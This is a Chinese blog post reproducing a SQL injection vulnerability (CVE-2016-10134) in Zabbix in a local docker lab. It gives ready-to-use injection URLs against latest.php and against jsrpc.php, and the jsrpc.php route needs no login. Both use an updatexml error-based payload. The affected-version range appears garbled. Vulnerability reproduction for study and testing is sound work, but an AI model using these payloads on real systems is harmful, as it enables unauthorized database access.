# zabbix latest.php SQL 注入漏洞（CVE-2016-10134） - NoCirc1e - 博客园

> 原文：[`www.cnblogs.com/NoCirc1e/p/16283340.html`](https://www.cnblogs.com/NoCirc1e/p/16283340.html)

zabbix 是一款服务器监控软件，其由 server、agent、web 等模块组成，其中 web 模块由 PHP 编写，用来显示数据库中的结果。

## 漏洞版本

*   2.2.x
*   3.3.0-3.03

## 运行环境

执行如下命令启动 zabbix 3.0.3:

```
docker-compose up -d
```

![](img/2d86f169e5c18977175a024696b30ee5.png)

执行命令后，将启动数据库（mysql）、zabbix server、zabbix agent、zabbix web。如果内存稍小，可能会存在某个容器挂掉的情况，我们可以通过`docker-compose ps`查看容器状态，并通过`docker-compose start`来重新启动容器。

## 漏洞复现

访问`http://your-ip:8080`，用账号`guest`（密码为空）登录游客账户。

登录后，查看 Cookie 中的`zbx_sessionid`（使用 Bp 抓包获取 Cookie），复制后 16 位字符：

![](img/9aebcbc2771d77de77e3d81f1c9453bb.png)![](img/fedc138864fda7163d16188e3474b2ab.png)![](img/41d555a6f54cc9e2787f9a096cdbf369.png)

将这 16 个字符作为 sid 的值，访问`http://your-ip:8080/latest.php?output=ajax&sid=98e97a06a1425522&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0)`，可见成功注入

![](img/6350e46e754a563be552ea8dc989a9cc.png)

这个漏洞也可以通过 jsrpc.php 触发，且无需登录：`http://your-ip:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)`

![](img/3369c55c077f65faeca81f3ea464c747.png)